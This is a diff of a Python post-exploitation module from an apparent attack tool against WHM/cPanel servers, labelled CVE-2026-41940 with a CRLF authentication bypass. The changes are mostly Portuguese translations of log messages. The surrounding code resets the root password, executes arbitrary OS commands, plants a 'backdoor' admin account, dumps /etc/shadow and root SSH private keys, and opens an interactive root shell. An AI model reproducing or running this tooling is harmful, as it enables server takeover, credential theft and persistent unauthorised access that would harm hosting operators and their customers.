@@ -3,10 +3,6 @@
 import json, threading
 from concurrent.futures import ThreadPoolExecutor, as_completed
 from urllib.parse import quote
-from . import config as cfg
-from . import http
-from . import core
-from . import exploit
 from .config import C, log, safe_print
 from .core import ScanCtx, build_url
 from .exploit import whm_api
@@ -32,7 +28,7 @@ def action_list_accounts(ctx: ScanCtx):
         safe_print(str(data)[:1000])
 
 def action_change_passwd(ctx: ScanCtx, new_password: str):
-    log("API", f"Alterando password root → {new_password}")
+    log("API", "Alterando a senha do root...")
     s, data = whm_api(ctx, "passwd", {"user": "root", "password": new_password})
     safe_print(json.dumps(data, indent=2)[:800] if isinstance(data, dict)
                else str(data)[:800])
@@ -40,7 +36,7 @@ def action_change_passwd(ctx: ScanCtx, new_password: str):
 def action_exec_cmd(ctx: ScanCtx, cmd: str):
     """Executar comando do SO — prova métodos até que um funcione."""
     cookie_enc = quote(ctx.session_base)
-    log("API", f"Ejecutando: {cmd}")
+    log("API", f"Executando: {cmd}")
 
     # Method 1: WHM json-api/scripts/exec
     s, data = whm_api(ctx, "scripts/exec", {"command": cmd})
@@ -109,10 +105,10 @@ def action_read_file(ctx: ScanCtx, path: str):
     if content:
         safe_print(f"{C.GREEN}{content[:2000]}{C.RESET}")
     else:
-        log("WARN", f"Não se pôde ler {path} — a licença pode bloquear o acesso")
+        log("WARN", f"Não foi possível ler {path} — a licença pode bloquear o acesso")
 
 def action_server_info(ctx: ScanCtx):
-    """Recopilar info do servidor — todas as chamadas API em paralelo."""
+    """Coletar informações do servidor — todas as chamadas API em paralelo."""
     log("API", "Coletando info do servidor (endpoints seguros por licença)...")
     endpoints = [
         ("gethostname",   {}, "hostname"),
@@ -150,7 +146,7 @@ def action_version(ctx: ScanCtx):
                else str(data)[:600])
 
 def action_create_user(ctx: ScanCtx, username: str, domain: str, passwd: str):
-    log("API", f"Creando conta: {username} / {domain}")
+    log("API", f"Criando conta: {username} / {domain}")
     s, data = whm_api(ctx, "createacct",
                       {"username": username, "domain": domain,
                        "password": passwd, "plan": "default"})
@@ -159,7 +155,7 @@ def action_create_user(ctx: ScanCtx, username: str, domain: str, passwd: str):
 
 def action_add_admin(ctx: ScanCtx, username: str, password: str):
     """Crear uma nova conta backdoor reseller/admin de WHM."""
-    log("API", f"Agregando admin backdoor: {username}")
+    log("API", f"Adicionando admin backdoor: {username}")
 
     s, data = whm_api(ctx, "createacct",
                       {"username": username, "domain": f"{username}.invalid",
@@ -180,8 +176,8 @@ def action_add_admin(ctx: ScanCtx, username: str, password: str):
     safe_print(f"  login : {build_url(ctx.scheme, ctx.host, ctx.port, '/login')}\n")
 
 def action_dump(ctx: ScanCtx):
-    """Dump masivo: contas + arquivos sensibles críticos."""
-    log("API", "Iniciando dump masivo...")
+    """Dump massivo: contas + arquivos sensíveis críticos."""
+    log("API", "Iniciando dump massivo...")
 
     # Cuentas
     s, data = whm_api(ctx, "listaccts", {"search": "", "searchtype": "user"})
@@ -195,7 +191,7 @@ def action_dump(ctx: ScanCtx):
                        f"{a.get('domain','?'):30s} "
                        f"{a.get('email','?')}{C.RESET}")
 
-    # Archivos sensibles
+    # Arquivos sensíveis
     dump_files = [
         "/etc/shadow",
         "/root/.ssh/id_rsa",
@@ -214,14 +210,14 @@ def action_dump(ctx: ScanCtx):
             safe_print(f"{C.RED}{'─'*60}{C.RESET}")
             safe_print(f"{C.GREEN}{content[:3000]}{C.RESET}")
         else:
-            log("SKIP", f"Não se pode ler {fpath} — pode não existir ou a licença o bloquea")
+            log("SKIP", f"Não foi possível ler {fpath} — pode não existir ou a licença bloqueia")
 
 # ══════════════════════════════════════════════════════════════
 #  DESPACHADOR DE AÇÕES — usado por alvo único e --post-all
 # ══════════════════════════════════════════════════════════════
 def run_action(ctx: ScanCtx, args):
     a = args.action.lower()
-    log("API", f"Ejecutando ação post-exploit: {a}", f"{ctx.host}:{ctx.port}")
+    log("API", f"Executando ação post-exploit: {a}", f"{ctx.host}:{ctx.port}")
 
     if a == "list":
         action_list_accounts(ctx)
@@ -273,7 +269,7 @@ def whm_shell(ctx: ScanCtx):
     target_display = ctx.canonical or f"{ctx.host}:{ctx.port}"
     print(f"\n{C.RED}{C.BOLD}{'═'*60}{C.RESET}")
     print(f"{C.RED}{C.BOLD}  WHM Shell — {target_display}{C.RESET}")
-    print(f"  {C.DIM}CVE-2026-41940 | Auth: bypass CRLF | Escriba 'help'{C.RESET}")
+    print(f"  {C.DIM}CVE-2026-41940 | Auth: bypass CRLF | Digite 'help'{C.RESET}")
     print(f"{C.RED}{C.BOLD}{'═'*60}{C.RESET}\n")
 
     prompt = (f"{C.RED}root{C.RESET}@{C.CYAN}{target_display}{C.RESET} "
@@ -357,7 +353,7 @@ def whm_shell(ctx: ScanCtx):
                 if content:
                     print(f"{C.GREEN}{content[:2000]}{C.RESET}")
                 else:
-                    print(f"  {C.DIM}Não se pode ler {arg} — "
+                    print(f"  {C.DIM}Não foi possível ler {arg} — "
                           f"a licença pode bloquear o acesso{C.RESET}")
 
             elif cmd == "ls":
